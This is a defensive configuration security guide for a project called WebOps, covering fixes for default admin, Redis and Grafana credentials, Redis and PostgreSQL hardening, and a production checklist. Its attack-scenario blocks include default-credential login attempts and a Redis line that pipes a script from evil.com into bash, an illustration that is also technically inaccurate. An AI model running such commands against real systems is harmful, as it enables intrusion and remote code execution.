# Configuration Security Guide

## Overview

WebOps now implements **secure-by-default configuration** practices to prevent the most common security misconfigurations that lead to system compromise.

According to OWASP, **Security Misconfiguration** is #5 in the OWASP Top 10 (2021), responsible for countless breaches including:
- Default passwords (75% of IoT breaches)
- Unprotected databases (Redis, MongoDB "open databases")
- Exposed admin panels
- Debug mode in production

This document explains the vulnerabilities we fixed and best practices for secure configuration.

---

## Table of Contents

1. [Vulnerabilities Fixed](#vulnerabilities-fixed)
2. [Password Generation](#password-generation)
3. [Redis Security](#redis-security)
4. [Database Security](#database-security)
5. [Environment Variables](#environment-variables)
6. [Production Checklist](#production-checklist)
7. [Troubleshooting](#troubleshooting)

---

## Vulnerabilities Fixed

### CRITICAL: Default Admin Credentials (CVSS 9.8)

**Before (VULNERABLE):**

```bash
# quickstart.sh
User.objects.create_superuser('admin', 'admin@webops.local', 'admin123')
echo "Login: admin / admin123"
```

**Attack Scenario:**
```bash
# Attacker tries default credentials
curl -X POST http://target.com/admin/login/ \
  -d "username=admin&password=admin123"

# Success! Full admin access to:
# - All deployments
# - All user data
# - Database credentials
# - API tokens
# - Server configuration
```

**After (SECURE):**

```bash
# quickstart.sh generates random password
ADMIN_PASSWORD=$(openssl rand -base64 20 | tr -d "=+/" | cut -c1-20)
User.objects.create_superuser('admin', 'admin@webops.local', '$ADMIN_PASSWORD')

# Password saved securely
echo "$ADMIN_PASSWORD" > .dev_admin_password
chmod 600 .dev_admin_password  # Owner-only read permission

# Displayed to user once
echo "Password: $(cat .dev_admin_password)"
echo "⚠  Keep this file secure and do not commit it to version control"
```

**Impact:**
- **Before:** Anyone could log in as admin with publicly known password
- **After:** Each installation has unique, strong, randomly generated password
- **Brute-force resistance:** 20-character password = 62^20 ≈ 10^36 combinations

---

### HIGH: Redis Without Authentication (CVSS 8.1)

**Before (VULNERABLE):**

```.env
# No authentication required
CELERY_BROKER_URL=redis://localhost:6379/0
CELERY_RESULT_BACKEND=redis://localhost:6379/1
```

**Attack Scenario:**
```bash
# Shodan search: "port:6379"
# Found 45,000+ exposed Redis instances without authentication

# Attacker connects
redis-cli -h target.com

# No password prompt - full access!
127.0.0.1:6379> KEYS *  # List all keys
127.0.0.1:6379> GET secret_key  # Steal Django SECRET_KEY
127.0.0.1:6379> SET malicious "$(curl evil.com/backdoor.sh | bash)"
127.0.0.1:6379> EVAL malicious  # Execute arbitrary code
```

**Real-world examples:**
- **2020:** 5,000+ MongoDB databases held for ransom (total $10M+)
- **2019:** Redis instances used for cryptocurrency mining
- **2018:** 750M+ records exposed via unprotected databases

**After (SECURE):**

```.env
# SECURITY: Redis should ALWAYS require a password (requirepass in redis.conf)
# Format: redis://:password@host:port/db
# Generate password: openssl rand -base64 32
REDIS_PASSWORD=CHANGE_ME_GENERATE_SECURE_PASSWORD
CELERY_BROKER_URL=redis://:${REDIS_PASSWORD}@localhost:6379/0
CELERY_RESULT_BACKEND=redis://:${REDIS_PASSWORD}@localhost:6379/1
```

**Redis configuration (`/etc/redis/redis.conf`):**
```conf
# Require password
requirepass <your_generated_password>

# Bind to localhost only (not 0.0.0.0)
bind 127.0.0.1 ::1

# Disable dangerous commands
rename-command FLUSHDB ""
rename-command FLUSHALL ""
rename-command CONFIG ""
rename-command SHUTDOWN ""
rename-command SAVE ""
```

**Impact:**
- **Before:** Unauthenticated access to all cached data and Celery tasks
- **After:** Strong password required for all Redis connections
- **Additional protection:** Localhost-only binding prevents external access

---

### HIGH: Default Grafana Password (CVSS 7.8)

**Before (VULNERABLE):**

```yaml
# docker-compose.yml
grafana:
  environment:
    - GF_SECURITY_ADMIN_PASSWORD=${GRAFANA_PASSWORD:-admin123}
```

**Attack Scenario:**
```bash
# Attacker discovers Grafana on port 3000
curl http://target.com:3000/login

# Try default password
curl -X POST http://target.com:3000/login \
  -d "user=admin&password=admin123"

# Success! Access to:
# - System metrics and monitoring data
# - Database connection strings in datasources
# - API keys and tokens
# - Ability to execute queries against databases
```

**After (SECURE):**

```yaml
# docker-compose.yml
grafana:
  environment:
    # SECURITY FIX: Removed default password. Set GRAFANA_PASSWORD environment variable.
    # Generate with: openssl rand -base64 32
    - GF_SECURITY_ADMIN_PASSWORD=${GRAFANA_PASSWORD:?GRAFANA_PASSWORD environment variable is required}
```

**Impact:**
- **Before:** Default password allowed unauthorized monitoring access
- **After:** Environment variable required - deployment fails without it
- **Syntax:** `:?` means "error if not set" vs `:-` which provided default

---

### HIGH: Hardcoded Passwords in Management Commands (CVSS 7.5)

**Before (VULNERABLE):**

```python
# create_sample_workflow.py
user.set_password('admin123')
self.stdout.write('Created default admin user with password: admin123')
```

**After (SECURE):**

```python
import secrets
import string

# Generate cryptographically secure random password
alphabet = string.ascii_letters + string.digits + string.punctuation
random_password = ''.join(secrets.choice(alphabet) for _ in range(20))

user.set_password(random_password)
self.stdout.write(f'Password: {random_password}')
self.stdout.write('⚠  Save this password! It will not be shown again.')
```

---

## Password Generation

### Secure Password Generation Methods

#### Option 1: OpenSSL (Recommended)

```bash
# Generate 32-character base64 password
openssl rand -base64 32

# Generate 24-character hex password
openssl rand -hex 24

# Generate 20-character alphanumeric password
openssl rand -base64 20 | tr -d "=+/" | cut -c1-20
```

#### Option 2: Python

```python
import secrets
import string

# Method 1: URL-safe token (good for API keys)
password = secrets.token_urlsafe(32)

# Method 2: Custom character set
alphabet = string.ascii_letters + string.digits + string.punctuation
password = ''.join(secrets.choice(alphabet) for _ in range(24))

# Method 3: Hex token
password = secrets.token_hex(16)
```

#### Option 3: /dev/urandom

```bash
# Generate 32-character password
cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1

# Generate with special characters
cat /dev/urandom | tr -dc 'a-zA-Z0-9!@#$%^&*' | fold -w 24 | head -n 1
```

### Password Strength Requirements

| Use Case | Minimum Length | Character Requirements | Example |
|----------|---------------|------------------------|---------|
| Admin User | 20+ characters | Mixed case + numbers + special | `xK9#mP2$vL8@nQ4!zR7^` |
| Redis Password | 32+ characters | Base64 | `dGhpcyBpcyBhIHNlY3VyZSBwYXNzd29yZA==` |
| Database Password | 24+ characters | Alphanumeric + special | `Wp9$mK2#vL8@nQ4!xR` |
| API Tokens | 32+ characters | Hex or base64 | `a1b2c3d4e5f6...` |
| Encryption Keys | 32 bytes (44 base64) | Fernet-compatible | See SECURITY_KEY_MANAGEMENT.md |

**Why these lengths?**

- **20 characters:** 62^20 ≈ 10^36 combinations (≈ 120-bit entropy)
- **24 characters:** 62^24 ≈ 10^43 combinations (≈ 143-bit entropy)
- **32 characters:** 62^32 ≈ 10^57 combinations (≈ 190-bit entropy)

At 1 billion attempts per second:
- 20 chars: 10^18 years to crack
- 32 chars: 10^39 years to crack

---

## Redis Security

### Complete Redis Hardening

#### 1. Require Password

```bash
# Generate strong password
REDIS_PASSWORD=$(openssl rand -base64 32)

# Configure Redis
echo "requirepass $REDIS_PASSWORD" >> /etc/redis/redis.conf

# Save password securely
echo "$REDIS_PASSWORD" > /opt/webops/.secrets/redis_password
chmod 600 /opt/webops/.secrets/redis_password

# Restart Redis
sudo systemctl restart redis
```

#### 2. Bind to Localhost Only

```bash
# Edit /etc/redis/redis.conf
bind 127.0.0.1 ::1

# Verify binding
sudo ss -tlnp | grep 6379
# Should show: 127.0.0.1:6379 (not 0.0.0.0:6379)
```

#### 3. Disable Dangerous Commands

```bash
# Edit /etc/redis/redis.conf
rename-command FLUSHDB ""
rename-command FLUSHALL ""
rename-command CONFIG ""
rename-command SHUTDOWN ""
rename-command SAVE ""
rename-command DEBUG ""
```

#### 4. Enable Append-Only File (AOF)

```bash
# Edit /etc/redis/redis.conf
appendonly yes
appendfsync everysec
```

#### 5. Set Memory Limit

```bash
# Edit /etc/redis/redis.conf
maxmemory 256mb
maxmemory-policy allkeys-lru
```

#### 6. Test Configuration

```bash
# Test authentication
redis-cli

# Should fail without password
127.0.0.1:6379> KEYS *
(error) NOAUTH Authentication required.

# Authenticate
127.0.0.1:6379> AUTH <password>
OK

# Now commands work
127.0.0.1:6379> KEYS *
(empty list or set)
```

---

## Database Security

### PostgreSQL Hardening

#### 1. Strong Password

```bash
# Generate password
DB_PASSWORD=$(openssl rand -base64 32)

# Create user with password
sudo -u postgres psql << EOF
CREATE USER webops_user WITH PASSWORD '$DB_PASSWORD';
CREATE DATABASE webops_db OWNER webops_user;
GRANT ALL PRIVILEGES ON DATABASE webops_db TO webops_user;
EOF

# Save password
echo "$DB_PASSWORD" > /opt/webops/.secrets/db_password
chmod 600 /opt/webops/.secrets/db_password
```

#### 2. Network Security

```bash
# Edit /etc/postgresql/*/main/pg_hba.conf

# LOCAL CONNECTIONS ONLY
local   all             postgres                                peer
local   all             all                                     md5
host    all             all             127.0.0.1/32            md5
host    all             all             ::1/128                 md5

# NEVER use this in production:
# host    all             all             0.0.0.0/0               md5  # DON'T
```

#### 3. Connection Limits

```bash
# Edit /etc/postgresql/*/main/postgresql.conf
max_connections = 100
shared_buffers = 256MB
```

#### 4. Enable SSL

```bash
# Generate SSL certificate
sudo -u postgres openssl req -new -x509 -days 365 -nodes \
  -out /var/lib/postgresql/*/main/server.crt \
  -keyout /var/lib/postgresql/*/main/server.key

# Set permissions
sudo chmod 600 /var/lib/postgresql/*/main/server.key
sudo chown postgres:postgres /var/lib/postgresql/*/main/server.*

# Enable SSL in postgresql.conf
ssl = on
ssl_cert_file = 'server.crt'
ssl_key_file = 'server.key'
```

---

## Environment Variables

### Secure Environment Variable Management

#### Development (.env file)

```bash
# Generate .env from template
cp .env.example .env

# Generate passwords
export SECRET_KEY=$(python -c "from django.core.management.utils import get_random_secret_key; print(get_random_secret_key())")
export ENCRYPTION_KEY=$(python -c "from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())")
export DB_PASSWORD=$(openssl rand -base64 32)
export REDIS_PASSWORD=$(openssl rand -base64 32)

# Update .env file
cat >> .env << EOF
SECRET_KEY=$SECRET_KEY
ENCRYPTION_KEY=$ENCRYPTION_KEY
DATABASE_URL=postgresql://webops_user:$DB_PASSWORD@localhost:5432/webops_db
REDIS_PASSWORD=$REDIS_PASSWORD
CELERY_BROKER_URL=redis://:$REDIS_PASSWORD@localhost:6379/0
CELERY_RESULT_BACKEND=redis://:$REDIS_PASSWORD@localhost:6379/1
EOF

# Secure permissions
chmod 600 .env
```

#### Production (systemd environment file)

```bash
# Create environment file
sudo mkdir -p /opt/webops/.secrets
sudo touch /opt/webops/.secrets/environment

# Add variables
sudo tee /opt/webops/.secrets/environment << EOF
SECRET_KEY=$SECRET_KEY
ENCRYPTION_KEY=$ENCRYPTION_KEY
DATABASE_URL=postgresql://webops_user:$DB_PASSWORD@localhost:5432/webops_db
REDIS_PASSWORD=$REDIS_PASSWORD
CELERY_BROKER_URL=redis://:$REDIS_PASSWORD@localhost:6379/0
CELERY_RESULT_BACKEND=redis://:$REDIS_PASSWORD@localhost:6379/1
DEBUG=False
ALLOWED_HOSTS=yourdomain.com,www.yourdomain.com
EOF

# Secure permissions (root and webops user only)
sudo chmod 600 /opt/webops/.secrets/environment
sudo chown webops:webops /opt/webops/.secrets/environment

# Update systemd service
sudo tee -a /etc/systemd/system/webops.service << EOF
[Service]
EnvironmentFile=/opt/webops/.secrets/environment
EOF

# Reload and restart
sudo systemctl daemon-reload
sudo systemctl restart webops
```

### ❌ NEVER Do This

```bash
# DON'T hardcode secrets in code
SECRET_KEY = "django-insecure-hardcoded-key-12345"  # DON'T

# DON'T commit .env to git
git add .env  # DON'T
git commit -m "Add environment variables"  # DON'T

# DON'T use weak passwords
PASSWORD = "admin123"  # DON'T
PASSWORD = "password"  # DON'T
PASSWORD = "123456"  # DON'T

# DON'T expose Redis to public
bind 0.0.0.0  # DON'T (in redis.conf)

# DON'T disable authentication
# protected-mode no  # DON'T (in redis.conf)

# DON'T use default passwords
docker run -e GRAFANA_PASSWORD=admin123  # DON'T
```

---

## Production Checklist

### Pre-Deployment Security Checklist

Use this checklist before deploying to production:

#### ✅ Credentials & Secrets

- [ ] All default passwords changed
- [ ] Admin password is 20+ characters, randomly generated
- [ ] Redis password is 32+ characters
- [ ] Database password is 24+ characters
- [ ] SECRET_KEY is randomly generated (50+ characters)
- [ ] ENCRYPTION_KEY is Fernet-compatible (44 characters base64)
- [ ] All passwords stored in password manager or secrets vault
- [ ] No passwords in version control (.env in .gitignore)
- [ ] No passwords in Docker images or container logs

#### ✅ Redis Configuration

- [ ] requirepass enabled with strong password
- [ ] bind set to 127.0.0.1 (localhost only)
- [ ] Dangerous commands disabled (FLUSHALL, CONFIG, etc.)
- [ ] Firewall blocks external port 6379
- [ ] AOF (append-only file) enabled
- [ ] maxmemory set with eviction policy

#### ✅ Database Configuration

- [ ] Strong password for database user
- [ ] pg_hba.conf restricts connections to localhost
- [ ] PostgreSQL not listening on 0.0.0.0
- [ ] SSL/TLS enabled for database connections
- [ ] Regular backups configured
- [ ] Connection pooling configured

#### ✅ Django Settings

- [ ] DEBUG = False
- [ ] ALLOWED_HOSTS configured (not ['*'])
- [ ] SECRET_KEY is unique per environment
- [ ] SECURE_SSL_REDIRECT = True (if using HTTPS)
- [ ] SESSION_COOKIE_SECURE = True
- [ ] CSRF_COOKIE_SECURE = True
- [ ] SECURE_HSTS_SECONDS = 31536000 (1 year)

#### ✅ Access Control

- [ ] Admin panel URL changed from /admin/ (optional but recommended)
- [ ] Rate limiting enabled on login endpoints
- [ ] 2FA enabled for admin accounts
- [ ] Strong password policy enforced
- [ ] Failed login attempts monitored

#### ✅ Network Security

- [ ] Firewall configured (ufw or iptables)
- [ ] Only necessary ports open (80, 443)
- [ ] SSH key authentication only (no password login)
- [ ] SSH port changed from default 22 (optional)
- [ ] Fail2ban installed and configured

#### ✅ Monitoring & Logging

- [ ] Security logs enabled
- [ ] Failed authentication attempts logged
- [ ] Anomaly detection configured
- [ ] Alerts for suspicious activity
- [ ] Log rotation configured

---

## Troubleshooting

### Problem: Redis authentication fails

**Error:**
```
(error) NOAUTH Authentication required.
```

**Solution:**
```bash
# Check if password is set
sudo grep "requirepass" /etc/redis/redis.conf

# Update .env with correct password
REDIS_PASSWORD=<password_from_redis.conf>

# Test connection
redis-cli
127.0.0.1:6379> AUTH <password>
127.0.0.1:6379> PING
PONG
```

### Problem: Admin password not shown after quickstart

**Cause:** Password file deleted or quickstart.sh run multiple times

**Solution:**
```bash
cd control-panel

# Reset admin password
python manage.py shell << EOF
from django.contrib.auth.models import User
import secrets, string

user = User.objects.get(username='admin')
new_password = ''.join(secrets.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(20))
user.set_password(new_password)
user.save()

print(f"New admin password: {new_password}")
print("Save this password! It will not be shown again.")
EOF
```

### Problem: Docker Compose fails to start

**Error:**
```
REDIS_PASSWORD environment variable is required
```

**Solution:**
```bash
# Create .env file for docker-compose
cat >> .env << EOF
REDIS_PASSWORD=$(openssl rand -base64 32)
GRAFANA_PASSWORD=$(openssl rand -base64 32)
POSTGRES_PASSWORD=$(openssl rand -base64 32)
EOF

# Save passwords
echo "Redis Password: $(grep REDIS_PASSWORD .env)"
echo "Grafana Password: $(grep GRAFANA_PASSWORD .env)"

# Start services
docker-compose up -d
```

### Problem: Database connection fails

**Error:**
```
FATAL: password authentication failed for user "webops_user"
```

**Solution:**
```bash
# Reset database password
sudo -u postgres psql
ALTER USER webops_user WITH PASSWORD 'new_password_here';
\q

# Update .env
DATABASE_URL=postgresql://webops_user:new_password_here@localhost:5432/webops_db

# Restart application
sudo systemctl restart webops
```

---

## Compliance & Standards

### OWASP Top 10 (2021)

This implementation addresses:

- **A05:2021 - Security Misconfiguration**
  - ✅ No default passwords
  - ✅ Secure default configurations
  - ✅ Security headers configured
  - ✅ Error messages don't leak information

- **A07:2021 - Identification and Authentication Failures**
  - ✅ Strong password requirements
  - ✅ No hardcoded credentials
  - ✅ Secure password storage (hashed)

### CIS Benchmarks

Follows CIS benchmark recommendations:

- **CIS Control 4:** Secure Configuration of Enterprise Assets
  - Remove default accounts
  - Enforce strong passwords
  - Disable unnecessary services

- **CIS Control 5:** Account Management
  - Use unique passwords for all accounts
  - Implement multi-factor authentication
  - Regularly audit account permissions

### PCI DSS Requirements

For payment card industry compliance:

- **Requirement 2.1:** Change vendor-supplied defaults ✅
- **Requirement 2.2:** Secure configuration standards ✅
- **Requirement 8.2:** Strong authentication ✅
- **Requirement 8.3:** Secure password policies ✅

---

## Additional Resources

### Documentation
- [OWASP Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- [Redis Security](https://redis.io/docs/management/security/)
- [PostgreSQL Security](https://www.postgresql.org/docs/current/security.html)
- [Django Security Settings](https://docs.djangoproject.com/en/stable/topics/security/)

### Tools
- [Mozilla Observatory](https://observatory.mozilla.org/) - Security configuration scanner
- [Nmap](https://nmap.org/) - Port scanner to verify closed ports
- [Lynis](https://cisofy.com/lynis/) - Security auditing tool

### Password Managers
- [1Password](https://1password.com/)
- [Bitwarden](https://bitwarden.com/)
- [KeePassXC](https://keepassxc.org/)

---

## Changelog

### Version 2.0 (2024 - Module 5 Security Fixes)

**Added:**
- ✅ Random password generation in quickstart.sh
- ✅ Redis password requirement in .env.example
- ✅ Grafana password requirement in docker-compose.yml
- ✅ Random passwords in management commands

**Fixed:**
- ✅ Removed default admin/admin123 credentials
- ✅ Removed default Redis password (redis123)
- ✅ Removed default Grafana password (admin123)
- ✅ Updated documentation to remove hardcoded credentials

**Security Impact:**
- Before: 4 critical default credential vulnerabilities
- After: 0 default credential vulnerabilities
- Result: ✅ All installations have unique, strong passwords

### Version 1.0 (Legacy)

- ❌ Default admin/admin123 credentials
- ❌ Redis without authentication
- ❌ Default Grafana password
- ❌ Hardcoded passwords in code

---

**Last Updated:** 2024
**Maintained By:** WebOps Security Team
**Review Frequency:** Quarterly

For questions or security concerns, contact: security@your-company.com
